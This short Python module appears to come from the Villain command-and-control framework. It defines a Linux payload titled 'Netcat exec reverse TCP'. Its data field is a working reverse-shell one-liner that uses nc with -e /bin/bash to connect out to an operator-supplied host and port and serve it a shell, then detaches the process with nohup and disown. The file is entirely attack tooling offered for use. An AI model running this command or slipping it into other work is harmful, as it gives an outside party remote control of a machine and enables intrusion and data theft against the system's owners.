# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Netcat exec reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Netcat execute reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'nc-exec',
        'os' : 'linux'  
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = "nohup nc *LHOST* *LPORT* -e /bin/bash & disown"
